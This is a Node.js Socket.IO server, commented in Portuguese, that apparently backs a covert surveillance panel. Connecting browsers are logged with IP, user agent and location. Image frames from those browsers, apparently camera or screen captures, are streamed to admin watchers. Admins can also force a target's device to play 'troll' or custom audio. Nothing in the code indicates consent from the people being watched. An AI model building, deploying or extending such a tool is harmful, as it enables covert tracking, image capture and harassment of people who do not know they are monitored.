const express = require('express');
const http = require('http');
const path = require('path');
const { Server } = require('socket.io');
const { v4: uuid } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static(path.join(__dirname, 'public')));

const clients = new Map();

io.on('connection', socket => {
  const role = socket.handshake.query.role;

  if (role === 'client') {
    const id = uuid();
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    const ua = socket.handshake.headers['user-agent'] || 'desconhecido';

    clients.set(id, {
      uuid: id,
      ip,
      ua,
      connected_at: Date.now(),
      socket,
      watchers: []
    });

    socket.emit('id', id);
    broadcastClients();

    socket.on('frame', dataURL => {
      const c = clients.get(id);
      if (!c) return;
      c.watchers.forEach(w => io.to(w).emit('frame', { id, data: dataURL }));
    });

    socket.on('location', loc => {
      const c = clients.get(id);
      if (c) {
        c.location = loc;
        broadcastLocation(id, loc);
      }
    });

    socket.on('disconnect', () => {
      clients.delete(id);
      broadcastClients();
    });
  }

  if (role === 'admin') {
    socket.emit('clients', summary());

    socket.on('request-stream', uuid => {
      const c = clients.get(uuid);
      if (c && !c.watchers.includes(socket.id)) c.watchers.push(socket.id);
    });

    socket.on('stop-stream', uuid => {
      const c = clients.get(uuid);
      if (c) c.watchers = c.watchers.filter(x => x !== socket.id);
    });

    socket.on('troll-audio', uuid => {
      const c = clients.get(uuid);
      if (c) c.socket.emit('play-audio', {
        url: 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3'
      });
    });

    socket.on('custom-audio', ({ uuid, dataURL }) => {
      const c = clients.get(uuid);
      if (c) c.socket.emit('play-audio', { url: dataURL });
    });
    

    socket.on('stop-audio', uuid => {
      const c = clients.get(uuid);
      if (c) c.socket.emit('stop-audio');
    });

    socket.on('disconnect', () => {
      for (const c of clients.values())
        c.watchers = c.watchers.filter(x => x !== socket.id);
    });
  }
});

function summary() {
  return Array.from(clients.values()).map(c => ({
    uuid: c.uuid,
    ip: c.ip,
    ua: c.ua,
    connected_at: c.connected_at,
    location: c.location
  }));
}

function broadcastClients() {
  const list = summary();
  for (const s of io.sockets.sockets.values())
    if (s.handshake.query.role === 'admin') s.emit('clients', list);
}

function broadcastLocation(uuid, loc) {
  for (const s of io.sockets.sockets.values())
    if (s.handshake.query.role === 'admin') s.emit('location-update', { uuid, loc });
}



server.listen(3000, () => {
  console.log('✔ Servidor rodando em http://localhost:3000');
});
